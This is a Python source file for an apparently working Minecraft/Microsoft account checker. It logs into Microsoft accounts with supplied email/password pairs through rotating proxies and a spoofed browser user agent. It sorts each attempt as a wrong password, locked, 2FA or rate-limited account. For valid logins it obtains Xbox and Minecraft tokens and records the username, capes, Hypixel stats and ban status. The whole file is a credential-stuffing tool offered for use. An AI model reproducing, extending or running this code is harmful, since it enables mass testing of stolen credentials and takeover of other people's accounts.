"""
PassX MC Checker — HTTP only, no Chrome.
Xbox OAuth implicit grant. Token lives in the URL FRAGMENT — never auto-follow redirects.
"""
import html as htmlmod
import json
import re
import time
from urllib.parse import parse_qs, unquote, urljoin, urlparse

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
)
TIMEOUT = 25

AUTH_URL = (
    "https://login.live.com/oauth20_authorize.srf"
    "?client_id=00000000402B5328"
    "&redirect_uri=https://login.live.com/oauth20_desktop.srf"
    "&scope=service::user.auth.xboxlive.com::MBI_SSL"
    "&display=touch"
    "&response_type=token"
    "&locale=en"
)

TOKEN_RE = re.compile(r"access_token=([A-Za-z0-9._\-%=]+)", re.I)


def _proxies(use_proxy):
    if not use_proxy:
        return None
    try:
        from automation.proxymanager import get_proxy_manager
        p = get_proxy_manager().get_next_proxy()
        if not p:
            return None
        a = str(getattr(p, "auth_string", None) or f"{p.ip}:{p.port}")
        if "://" not in a:
            a = "http://" + a
        return {"http": a, "https": a}
    except Exception as e:
        print(f"⚠️ proxy skipped: {e}")
        return None


def _sess(proxies):
    s = requests.Session()
    s.verify = False
    s.headers.update({
        "User-Agent": UA,
        "Accept-Language": "en-US,en;q=0.9",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    })
    if proxies:
        s.proxies.update(proxies)
    return s


def _unescape(s):
    if not s:
        return s
    s = htmlmod.unescape(s)
    return (
        s.replace("\\/", "/")
        .replace("\\u0026", "&")
        .replace("&amp;", "&")
        .replace("\\u003d", "=")
        .replace("\\u0022", '"')
        .replace("\\u003c", "<")
        .replace("\\u003e", ">")
    )


def _ppft_urlpost(html):
    text = html or ""
    ppft = None
    url_post = None

    for pat in (
        r'name="PPFT"[^>]*value="([^"]+)"',
        r'value="([^"]+)"[^>]*name="PPFT"',
        r'name=\\"PPFT\\"[^>]*value=\\"([^\\"]+)\\"',
        r'"sFT"\s*:\s*"([^"]+)"',
        r"sFTTag:'<input[^>]*value=\"([^\"]+)\"",
        r'sFTTag:\'<input[^>]*value="([^"]+)"',
        r"sFT:'([^']+)'",
        r'"sFT"\s*,\s*"([^"]+)"',
        r'value=\\"(.+?)\\"',
    ):
        m = re.search(pat, text, re.S | re.I)
        if m and len(m.group(1) or "") > 8:
            cand = m.group(1)
            if "sFTTag" in pat or "PPFT" in pat or "sFT" in pat or len(cand) > 40:
                ppft = cand
                break

    for pat in (
        r'"urlPost"\s*:\s*"(.+?)"',
        r'"urlPost":"(.+?)"',
        r"urlPost:'(.+?)'",
        r'urlPost:"(.+?)"',
        r'<form[^>]+action="(https://login\.live\.com/[^"]+)"',
        r'<form[^>]+action=\\"(https://login\.live\.com/[^\\"]+)\\"',
        r"urlPost:\s*'(.+?)'",
    ):
        m = re.search(pat, text, re.S | re.I)
        if m:
            url_post = _unescape(m.group(1))
            if url_post and "login.live.com" in url_post:
                break
            url_post = None

    if not ppft:
        m = re.search(r'sFTTag:\'.*value="([^"]+)"', text, re.S | re.I)
        if m:
            ppft = m.group(1)

    return ppft, url_post


def _hidden_fields(html):
    fields = {}
    for m in re.finditer(
        r'<input[^>]+type=["\']hidden["\'][^>]*>',
        html or "",
        re.I,
    ):
        tag = m.group(0)
        name = re.search(r'name=["\']([^"\']+)["\']', tag, re.I)
        value = re.search(r'value=["\']([^"\']*)["\']', tag, re.I)
        if name:
            fields[htmlmod.unescape(name.group(1))] = htmlmod.unescape(value.group(1) if value else "")
    return fields


def _token_from_url(url):
    if not url:
        return None
    raw = _unescape(unquote(str(url)))
    m = TOKEN_RE.search(raw)
    if m:
        tok = unquote(m.group(1).split("&")[0].split("#")[0].split('"')[0])
        if len(tok) > 20:
            return tok
    try:
        parsed = urlparse(raw)
        for blob in (parsed.fragment, parsed.query):
            tok = (parse_qs(blob).get("access_token") or [None])[0]
            if tok and len(tok) > 20:
                return unquote(tok)
    except Exception:
        pass
    return None


def _scan(resp):
    tok = _token_from_url(getattr(resp, "url", ""))
    if tok:
        return tok
    for h in getattr(resp, "history", []) or []:
        tok = _token_from_url(h.url) or _token_from_url(h.headers.get("Location", ""))
        if tok:
            return tok
    tok = _token_from_url(resp.headers.get("Location", ""))
    if tok:
        return tok
    html = resp.text or ""
    tok = _token_from_url(html)
    if tok:
        return tok
    m = re.search(r'"access_token"\s*:\s*"([^"]+)"', html)
    if m and len(m.group(1)) > 20:
        return m.group(1)
    return None


def _classify(html, url=""):
    low = (html or "").lower()
    u = (url or "").lower()
    if "too many requests" in low or "unusual activity" in low:
        return "rate_limited", "Microsoft rate limited this IP"
    if "account has been locked" in low or "has been suspended" in low:
        return "locked", "Account locked by Microsoft"
    if any(x in low for x in (
        "password is incorrect",
        "account or password is incorrect",
        "that password is incorrect",
        "your account or password is incorrect",
        "we couldn't find an account",
        "that microsoft account doesn't exist",
        "tried to sign in too many times",
        "that account doesn't exist",
    )):
        return "bad", "Wrong email or password"
    blob = low + " " + u
    if any(x in blob for x in (
        "recover?mkt",
        "identity/confirm?mkt",
        "email/confirm?mkt",
        "/abuse?mkt=",
        "account.live.com/identity/confirm",
        "enter the code",
        "we sent a code",
        "get a code",
        "approve sign in",
        "help us protect",
        "verify your identity",
        "two-step",
        "authenticator",
    )):
        return "2fa", "2FA / identity verification enabled"
    return None, None


def _follow_for_token(s, r, max_hops=14):
    seen = set()
    for _ in range(max_hops):
        tok = _scan(r)
        if tok:
            return tok, r
        loc = r.headers.get("Location") or r.headers.get("location") or ""
        tok = _token_from_url(loc) or _token_from_url(getattr(r, "url", ""))
        if tok:
            return tok, r
        html = r.text or ""
        m = re.search(
            r'(?:window\.location|document\.location)\s*(?:\.replace)?\s*=?\s*\(?["\']([^"\']+)["\']',
            html, re.I,
        )
        if m:
            loc2 = _unescape(m.group(1))
            tok = _token_from_url(loc2)
            if tok:
                return tok, r
            if loc2.startswith("http") and r.status_code == 200:
                loc = loc or loc2
        if r.status_code in (301, 302, 303, 307, 308) and loc:
            if loc.startswith("/"):
                loc = urljoin(r.url, loc)
            key = loc.split("#")[0]
            if key in seen:
                break
            seen.add(key)
            r = s.get(key, timeout=TIMEOUT, allow_redirects=False)
            continue
        if r.status_code == 200 and html:
            action_m = re.search(r'<form[^>]+action=["\']([^"\']+)["\']', html, re.I)
            if action_m:
                action = _unescape(action_m.group(1))
                if action.startswith("/"):
                    action = urljoin(r.url, action)
                fields = _hidden_fields(html)
                low_act = action.lower()
                if fields and ("login.live.com" in low_act or "oauth20" in low_act or "microsoftonline" in low_act):
                    tok = _token_from_url(action)
                    if tok:
                        return tok, r
                    r = s.post(
                        action.split("#")[0],
                        data=fields,
                        timeout=TIMEOUT,
                        allow_redirects=False,
                        headers={"Content-Type": "application/x-www-form-urlencoded", "Referer": r.url},
                    )
                    continue
        break
    return _scan(r), r


def _login(email, password, proxies):
    s = _sess(proxies)
    r = s.get(AUTH_URL, timeout=TIMEOUT, allow_redirects=False)
    tok, r = _follow_for_token(s, r)
    if tok:
        return tok, s
    if r.status_code in (301, 302, 303, 307, 308) and r.headers.get("Location"):
        loc = r.headers.get("Location")
        if loc.startswith("/"):
            loc = urljoin(r.url, loc)
        r = s.get(loc.split("#")[0], timeout=TIMEOUT, allow_redirects=True)

    html = r.text or ""
    st, msg = _classify(html, r.url)
    if st:
        return {"status": st, "error": msg}, s
    ppft, url_post = _ppft_urlpost(html)
    if not ppft or not url_post:
        print("⚠️ PPFT parse failed. html sample:", html[:400].replace("\n", " "))
        return {"status": "error", "error": "Could not parse Microsoft login form"}, s
    print(f"🔑 PPFT ok ({len(ppft)} chars)")

    payload = {
        "login": email,
        "loginfmt": email,
        "passwd": password,
        "PPFT": ppft,
        "PPSX": "Passpor",
        "LoginOptions": "3",
        "type": "11",
        "NewUser": "1",
        "i13": "0",
        "i21": "0",
        "i2": "1",
    }
    payload.update(_hidden_fields(html))
    payload["login"] = email
    payload["loginfmt"] = email
    payload["passwd"] = password
    payload["PPFT"] = ppft

    r2 = s.post(
        url_post,
        data=payload,
        timeout=TIMEOUT,
        allow_redirects=False,
        headers={"Content-Type": "application/x-www-form-urlencoded", "Referer": r.url},
    )
    tok, r2 = _follow_for_token(s, r2)
    if tok:
        return tok, s

    html2 = r2.text or ""
    st, msg = _classify(html2, r2.url)
    if st:
        return {"status": st, "error": msg}, s

    if "stay signed in" in html2.lower() or "kmsi" in html2.lower() or "idSIButton9" in html2:
        ppft2, post2 = _ppft_urlpost(html2)
        post2 = post2 or r2.url
        fields = _hidden_fields(html2)
        if ppft2:
            fields["PPFT"] = ppft2
        fields.update({"LoginOptions": "1", "type": "28", "KMSI": "1"})
        r3 = s.post(
            post2,
            data=fields,
            timeout=TIMEOUT,
            allow_redirects=False,
            headers={"Content-Type": "application/x-www-form-urlencoded", "Referer": r2.url},
        )
        tok, r3 = _follow_for_token(s, r3)
        if tok:
            return tok, s
        st, msg = _classify(r3.text or "", r3.url)
        if st:
            return {"status": st, "error": msg}, s

    return {"status": "error", "error": "Microsoft login did not return a token"}, s


def _rps(s, msa):
    raw = unquote(msa or "")
    tickets = [raw]
    if raw.startswith("t=") or raw.startswith("d="):
        tickets += [raw[2:], ("d=" if raw.startswith("t=") else "t=") + raw[2:]]
    else:
        tickets += [f"t={raw}", f"d={raw}"]
    last = "unknown"
    for ticket in tickets:
        r = s.post(
            "https://user.auth.xboxlive.com/user/authenticate",
            json={
                "Properties": {
                    "AuthMethod": "RPS",
                    "SiteName": "user.auth.xboxlive.com",
                    "RpsTicket": ticket,
                },
                "RelyingParty": "http://auth.xboxlive.com",
                "TokenType": "JWT",
            },
            headers={"Content-Type": "application/json", "Accept": "application/json", "User-Agent": UA},
            timeout=TIMEOUT,
        )
        try:
            data = r.json() if r.text else {}
        except Exception:
            data = {}
        if r.status_code == 200 and data.get("Token"):
            uhs = data["DisplayClaims"]["xui"][0]["uhs"]
            print(f"✅ Xbox RPS ok ({ticket[:2]})")
            return data["Token"], uhs
        last = f"HTTP {r.status_code}"
        print(f"⚠️ Xbox RPS {ticket[:2]}: {last}")
    raise RuntimeError(f"Xbox RPS failed: {last}")


def _xsts(s, user_token):
    r = s.post(
        "https://xsts.auth.xboxlive.com/xsts/authorize",
        json={
            "Properties": {"SandboxId": "RETAIL", "UserTokens": [user_token]},
            "RelyingParty": "rp://api.minecraftservices.com/",
            "TokenType": "JWT",
        },
        headers={"Content-Type": "application/json", "Accept": "application/json", "User-Agent": UA},
        timeout=TIMEOUT,
    )
    try:
        data = r.json() if r.text else {}
    except Exception:
        data = {}
    if r.status_code == 401:
        xerr = str(data.get("XErr") or data.get("xErr") or "")
        if xerr == "2148916233":
            return None, None, "no_xbox"
        if xerr == "2148916238":
            return None, None, "child"
        return None, None, f"xsts_{xerr}"
    if r.status_code != 200 or not data.get("Token"):
        return None, None, f"xsts_http_{r.status_code}"
    uhs = data["DisplayClaims"]["xui"][0]["uhs"]
    return data["Token"], uhs, None


def _dash(u):
    u = (u or "").replace("-", "")
    if len(u) != 32:
        return u or "N/A"
    return f"{u[0:8]}-{u[8:12]}-{u[12:16]}-{u[16:20]}-{u[20:32]}"


def _json(r):
    try:
        return r.json() if r is not None and r.text else {}
    except Exception:
        return {}


def _optifine(name):
    if not name:
        return False
    try:
        r = requests.get(
            f"http://s.optifine.net/capes/{name}.png",
            headers={"User-Agent": UA},
            timeout=8,
            verify=False,
        )
        return r.status_code == 200 and str(r.headers.get("content-type", "")).startswith("image")
    except Exception:
        return False


def _hypixel(name):
    if not name:
        return {}
    try:
        r = requests.get(
            f"https://plancke.io/hypixel/player/stats/{name}",
            headers={"User-Agent": UA},
            timeout=12,
            verify=False,
        )
        src = r.text or ""
        out = {}
        if "is banned" in src.lower() or "permanently banned" in src.lower():
            out["banned"] = True
        m = re.search(r"Level:</b>\s*(.+?)<", src)
        if m:
            out["level"] = m.group(1).strip()
        m = re.search(r"<b>First login:\s*</b>\s*(.+?)<", src)
        if m:
            out["first_login"] = m.group(1).strip()
        m = re.search(r"<b>Last login:\s*</b>\s*(.+?)<", src)
        if m:
            out["last_login"] = m.group(1).strip()
        m = re.search(r"<li><b>Level:</b>\s*(.+?)</li>", src)
        if m:
            out["bw_stars"] = m.group(1).strip()
        return out
    except Exception:
        return {}


def _mc_info(s, mc_token):
    h = {
        "Authorization": f"Bearer {mc_token}",
        "User-Agent": UA,
        "Accept": "application/json",
    }
    ownership = "Unknown"
    try:
        ent = s.get(
            "https://api.minecraftservices.com/entitlements/mcstore",
            headers=h,
            timeout=TIMEOUT,
        )
        txt = ent.text or ""
        items = []
        try:
            items = [i.get("name", "") for i in (_json(ent) or {}).get("items", [])]
        except Exception:
            items = []
        java = '"product_minecraft"' in txt or any(
            n in ("game_minecraft", "product_minecraft")
            or ("minecraft" in n and "bedrock" not in n)
            for n in items
        )
        bedrock = "product_minecraft_bedrock" in txt or any("bedrock" in n for n in items)
        if java and bedrock:
            ownership = "Java + Bedrock"
        elif java:
            ownership = "Java"
        elif bedrock:
            ownership = "Bedrock"
        elif not items and "product_minecraft" not in txt:
            ownership = None
    except Exception as e:
        print(f"⚠️ entitlements: {e}")
        ownership = None

    profile = {}
    try:
        pr = s.get(
            "https://api.minecraftservices.com/minecraft/profile",
            headers=h,
            timeout=TIMEOUT,
        )
        if pr.status_code == 200:
            profile = _json(pr) or {}
        elif pr.status_code == 404:
            return {"status": "no_mc", "ownership": ownership or "None"}
    except Exception as e:
        print(f"⚠️ profile: {e}")

    namechange = {}
    try:
        nc = s.get(
            "https://api.minecraftservices.com/minecraft/profile/namechange",
            headers=h,
            timeout=TIMEOUT,
        )
        if nc.status_code == 200:
            namechange = _json(nc) or {}
    except Exception:
        pass

    username = profile.get("name") or ""
    if not username:
        return {"status": "no_mc", "ownership": ownership or "None"}

    uuid = _dash(profile.get("id") or "")
    capes = []
    for c in profile.get("capes") or []:
        alias = c.get("alias") or c.get("id") or "Cape"
        capes.append(f"{alias}*" if (c.get("state") or "").upper() == "ACTIVE" else alias)

    nc_out = {}
    if namechange:
        nc_out["can_change"] = "Yes" if namechange.get("nameChangeAllowed") else "No"
        ch = namechange.get("changedAt") or ""
        nc_out["last_changed"] = str(ch)[:19].replace("T", " ") if ch else "Never"

    return {
        "status": "hit",
        "username": username,
        "uuid": uuid,
        "ownership": ownership or "Java",
        "capes": ", ".join(capes) if capes else "None",
        "optifine_cape": _optifine(username),
        "hypixel": _hypixel(username),
        "name_change": nc_out,
    }


def check_mc_account(email, password, use_proxy=True):
    print(f"⛏️ MC check {email}  proxy={use_proxy}")
    proxies = _proxies(use_proxy)
    try:
        msa, s = _login(email, password, proxies)
        if isinstance(msa, dict):
            msa["email"] = email
            return msa

        s.headers.update({"User-Agent": UA, "Accept": "application/json"})
        user_tok, uhs = _rps(s, msa)
        xsts, uhs2, extra = _xsts(s, user_tok)
        if extra == "no_xbox":
            return {"status": "no_mc", "email": email}
        if extra == "child":
            return {"status": "2fa", "error": "Child account", "email": email}
        if not xsts:
            return {"status": "error", "error": str(extra), "email": email}

        r = s.post(
            "https://api.minecraftservices.com/authentication/login_with_xbox",
            json={"identityToken": f"XBL3.0 x={uhs2 or uhs};{xsts}"},
            headers={
                "Content-Type": "application/json",
                "Accept": "application/json",
                "User-Agent": UA,
            },
            timeout=TIMEOUT,
        )
        mc = (_json(r) or {}).get("access_token")
        if not mc:
            return {
                "status": "valid_no_mc",
                "error": f"No MC token HTTP {r.status_code}",
                "email": email,
            }

        info = _mc_info(s, mc)
        info["email"] = email
        print(f"✅ {email} → {info.get('status')} {info.get('username', '')}")
        return info
    except requests.exceptions.ProxyError:
        return {"status": "error", "error": "Dead proxy — rerun with Proxyless", "email": email}
    except requests.exceptions.ConnectTimeout:
        return {"status": "error", "error": "Timed out — rerun with Proxyless", "email": email}
    except requests.exceptions.ReadTimeout:
        return {"status": "error", "error": "Read timeout — rerun with Proxyless", "email": email}
    except Exception as e:
        print(f"❌ {e}")
        return {"status": "error", "error": str(e)[:220], "email": email}